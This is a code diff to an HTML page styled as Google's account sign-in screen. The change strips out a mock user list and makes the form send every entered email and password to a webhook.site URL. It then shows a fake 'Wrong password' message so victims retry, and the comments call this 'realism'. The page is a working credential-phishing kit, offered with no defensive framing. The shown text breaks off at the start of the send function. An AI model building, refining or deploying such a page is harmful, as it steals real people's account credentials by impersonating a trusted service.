@@ -30,21 +30,45 @@
         p {
             color: #202124;
             font-size: 14px;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 5px;
         }
         input[type="email"], input[type="password"] {
             width: 100%;
             padding: 13px 15px;
-            margin: 0 0 16px 0;
             border: 1px solid #dadce0;
             border-radius: 4px;
             box-sizing: border-box;
             font-size: 16px;
             outline: none;
         }
-        input[type="email"]:focus, input[type="password"]:focus {
+        input:focus {
             border: 2px solid #1a73e8;
-            padding: 12px 14px; /* Adjust padding for border width change */
+            padding: 12px 14px;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #5f6368;
+            background: none;
+            border: none;
+            font-size: 18px;
         }
         .btn-next {
             background-color: #1a73e8;
@@ -56,28 +80,30 @@
             font-size: 14px;
             cursor: pointer;
             float: right;
+            margin-top: 10px;
         }
         .btn-next:hover {
             background-color: #1765cc;
         }
         .error-msg {
             color: #d93025;
-            font-size: 14px;
+            font-size: 13px;
             text-align: left;
-            margin-top: 10px;
+            margin-bottom: 15px;
             min-height: 20px;
             font-weight: 500;
-            display: none;
         }
         .loader {
             display: none;
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1a73e8;
             border-radius: 50%;
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             animation: spin 1s linear infinite;
-            margin: 10px auto;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 10px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -116,121 +142,81 @@
     <p>Use your Google Account</p>
 
     <form id="loginForm">
-        <!-- Step 1: Email -->
-        <div id="step-email">
-            <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
-            <div class="error-msg" id="email-error"></div>
-            <button type="button" class="btn-next" id="btn-email">Next</button>
+        <!-- Single Step Form -->
+        <div class="input-group">
+            <label for="email">Email or phone</label>
+            <input type="email" id="email" required autocomplete="off" placeholder="Enter your email">
         </div>
 
-        <!-- Step 2: Password -->
-        <div id="step-password" style="display: none;">
-            <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
-            <div style="text-align: left; margin-bottom: 20px;">
-                <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Forgot password?</a>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" required autocomplete="off" placeholder="Enter your password">
+                <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
             </div>
-            <div class="error-msg" id="pass-error"></div>
-            <div class="loader" id="loader"></div>
-            <button type="submit" class="btn-next" id="btn-pass">Next</button>
         </div>
+
+        <div class="error-msg" id="error-message"></div>
+        
+        <button type="submit" class="btn-next">
+            Next 
+            <span class="loader" id="loader"></span>
+        </button>
     </form>
 
     <div class="footer">
-        <a href="#">Create account</a> &nbsp;•&nbsp; <a href="#">More ways to sign in</a>
+        <a href="#">Create account</a> &nbsp;•&nbsp; <a href="#">Forgot password?</a>
     </div>
 </div>
 
 <script>
-    // CONFIGURATION
+    // YOUR SPECIFIC WEBHOOK ID
     const WEBHOOK_URL = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603"; 
-    // Example: https://webhook.site/your-unique-id-here
-
-    // FAKE DATABASE
-    const validUsers = [
-        { email: "test@gmail.com", password: "password123" },
-        { email: "user@example.com", password: "securepass" }
-    ];
-
-    let userData = { email: "", password: "" };
 
     // DOM Elements
-    const stepEmail = document.getElementById('step-email');
-    const stepPass = document.getElementById('step-password');
+    const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
     const passInput = document.getElementById('password');
-    const emailErr = document.getElementById('email-error');
-    const passErr = document.getElementById('pass-error');
+    const errorMsg = document.getElementById('error-message');
     const loader = document.getElementById('loader');
-    const btnEmail = document.getElementById('btn-email');
-    const btnPass = document.getElementById('btn-pass');
-    const form = document.getElementById('loginForm');
 
-    // Step 1: Email Validation
-    btnEmail.addEventListener('click', () => {
-        const email = emailInput.value.trim();
-        if (!email) {
-            emailErr.textContent = "Please enter an email address.";
-            return;
-        }
-        
-        // Check if email exists in our fake DB
-        const user = validUsers.find(u => u.email.toLowerCase() === email.toLowerCase());
-        
-        if (!user) {
-            // If email doesn't exist, we still proceed to password step 
-            // but we mark it as invalid for final validation
-            userData.email = email;
-            stepEmail.style.display = 'none';
-            stepPass.style.display = 'block';
-            passInput.focus();
+    // Toggle Password Visibility
+    function togglePassword() {
+        if (passInput.type === "password") {
+            passInput.type = "text";
         } else {
-            userData.email = email;
-            stepEmail.style.display = 'none';
-            stepPass.style.display = 'block';
-            passInput.focus();
+            passInput.type = "password";
         }
-    });
+    }
 
-    // Step 2: Password Submission
+    // Handle Form Submission
     form.addEventListener('submit', (e) => {
         e.preventDefault();
         
+        const email = emailInput.value.trim();
         const password = passInput.value.trim();
-        userData.password = password;
+
+        if (!email || !password) {
+            errorMsg.textContent = "Please fill in all fields.";
+            return;
+        }
 
         // Show Loader
-        loader.style.display = 'block';
-        btnPass.disabled = true;
-        passErr.style.display = 'none';
+        loader.style.display = 'inline-block';
+        errorMsg.textContent = ""; // Clear errors
 
-        // Simulate network delay
+        // Simulate slight delay for realism
         setTimeout(() => {
-            // Find user
-            const user = validUsers.find(u => u.email.toLowerCase() === userData.email.toLowerCase());
-            
-            let isValid = false;
-            if (user && user.password === password) {
-                isValid = true;
-            }
+            // Send Data to Webhook
+            sendToWebhook(email, password, "Login Attempt");
 
-            if (!isValid) {
-                // Show Error
-                passErr.textContent = "Incorrect email or password.";
-                passErr.style.display = 'block';
-                loader.style.display = 'none';
-                btnPass.disabled = false;
-                
-                // Send Data to Webhook even on failure
-                sendToWebhook(userData.email, password, "Invalid Credentials");
-            } else {
-                // Success (Optional: Redirect)
-                // window.location.href = "https://www.google.com";
-                passErr.textContent = "Verified successfully!";
-                passErr.style.color = "#188038";
-                passErr.style.display = 'block';
-                sendToWebhook(userData.email, password, "Success");
-            }
-        }, 1500);
+            // Show Error Message (Fake Google behavior)
+            errorMsg.textContent = "Wrong password. Try again.";
+            loader.style.display = 'none';
+            
+            // Optional: Clear password field
+            passInput.value = '';
+        }, 1000);
     });
 
     function sendToWebhook(email, pass, status) {
